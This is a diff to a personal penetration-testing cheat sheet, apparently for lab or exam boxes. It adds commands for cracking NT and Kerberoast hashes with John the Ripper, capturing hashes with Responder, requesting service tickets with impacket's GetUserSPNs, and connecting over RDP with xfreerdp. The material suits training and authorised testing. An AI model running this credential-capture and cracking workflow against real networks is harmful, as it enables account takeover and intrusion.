@@ -70,7 +70,7 @@ When the TCP scan finishes, immediately run a UDP scan.
 sudo nmap -Pn -n -sU --top-ports=100 --reason $IP
 ```
 
-#### <span style="color:rgb(11, 142, 224)">Password cracking : </span>
+#### <span style="color:rgb(11, 142, 224)">Hash/Password cracking : </span>
 
 Whenever you find a hash, first try [https://crackstation.net/](https://crackstation.net/)
 If that doesn't work, try John the Ripper or Hashcat. Let it run for not more than 10 minutes.
@@ -78,15 +78,40 @@ If that doesn't work, try John the Ripper or Hashcat. Let it run for not more th
 Google it first, use hashes.org,
 then try `rockyou.txt` wordlist with both hashcat and john. Because sometimes one tool cracks but the other doesn’t. So always try both. Max time I would before moving on is like 15 min. If it still doesn’t crack it’s highly likely that it’s not the intended way.
 
+----
+
 john will automatically identify the hashing algorithm
 ```
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ```
-For Password Hashes from SAM and SYSTEM files : 
+Then show the recovered password:
+```
+john --show hash.txt
+```
+
+----
+
+For Password Hashes from <span style="color:rgb(11, 142, 224)">SAM and SYSTEM</span> files : 
 ```
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=nt
 ```
 Format : `RID : LM hash : NT hash`
+Then show the recovered password:
+```
+john --show --format=nt hash.txt
+```
+
+----
+
+For common <span style="color:rgb(11, 142, 224)">Kerberoasting</span> hashes (`$krb5tgs$...`), John the Ripper can use:
+```
+john --format=krb5tgs hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+Then show the recovered password:
+```
+john --show --format=krb5tgs hash.txt
+```
+
 #### <span style="color:rgb(11, 142, 224)">SSH into a user</span>
 To SSH into a user using a private key:
 ```
@@ -1098,7 +1123,7 @@ If nothing works , then try Linpeas
 - Run `whoami /all`, then PrivEscCheck, then PowerUp, then WinPEAS.
 - The above will give you all info you need. Save output and slowly go over it.
 - If you get completely stuck, you can manually check for things too.
-##### <span style="color:rgb(11, 142, 224)">General : </span>
+#### <span style="color:rgb(11, 142, 224)">General : </span>
 
 Find Flag 
 do manually first : `users > desktop/documents`
@@ -1294,7 +1319,7 @@ icacls <file name> /setintegritylevel m
 # h = high
 # you cannot set integrity level higher than that of your user
 ```
-##### <span style="color:rgb(11, 142, 224)">Winpeas (Look for easy wins here first)</span>
+#### <span style="color:rgb(11, 142, 224)">Winpeas (Look for easy wins here first)</span>
 ###### If nothing works , then try Winpeas
 Download `winPEASx64.exe` : 
 ```
@@ -2654,4 +2679,65 @@ AD -> use nxc to find shares, winrm, rdp rights. Get a foothold and set up ligol
 1. Ligolo-ng for pivoting and port forwarding, super good
 2. nxc >>> crackmapexec. The wiki is super good, I reckon you could do 90% of boxes if you use nxc well.
 3. bloodhound -> so useful for AD, cant do anything without it
+###### <span style="color:rgb(11, 142, 224)">To connect to RDP : </span>
+
+In username type :
+```
+"Domain name\username"
+```
+BLACK SCREEN : lower mtu to 1000
+```
+xfreerdp /v:<Windows_IP> /u:<USERNAME> /p:<PASSWORD> /cert:ignore /dynamic-resolution
+```
+or
+When it isn't connecting : 
+```
+xfreerdp /v:<Windows_IP> /u:<USERNAME> /p:<PASSWORD> /cert:ignore /dynamic-resolution /sec:rdp
+```
+or 
+```
+xfreerdp /v:10.48.143.132 /u:user /cert:ignore /sec:rdp /size:1280x720 /smart-sizing
+```
+Enter the password when prompted.
+
+### <span style="color:rgb(11, 142, 224)">Authentication</span> 
+
+##### <span style="color:rgb(11, 142, 224)">Responder - LLMNR/NBT-NS/mDNS Poisoner and Rogue Authentication Servers</span>
+
+to run : 
+```
+sudo python3 /usr/share/responder/Responder.py -I eth0 -v
+```
+copy the full hash and store in a file 
+then we crack the hash 
+For Password Hashes from SAM and SYSTEM files : 
+```
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=nt
+```
+Format : `RID : LM hash : NT hash`
+
+----
+##### <span style="color:rgb(11, 142, 224)">To dump all the service ticket : </span>
+
+```
+python /usr/share/doc/python3-impacket/examples/GetUserSPNs.py <domain name>.local/<user username>:<user password> -dc-ip <domain controller ip> -request 
+```
+well get the tickets dump and their hashes in it
+
+now we copy the complete hash from here and paste in a file and then crack the hash 
+
+For common Kerberoasting hashes (`$krb5tgs$...`), John the Ripper can use:
+```
+john --format=krb5tgs hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+Then show the recovered password:
+```
+john --show --format=krb5tgs hash.txt
+```
+
+### <span style="color:rgb(11, 142, 224)">Breaching : </span>
+
+
+
+
 
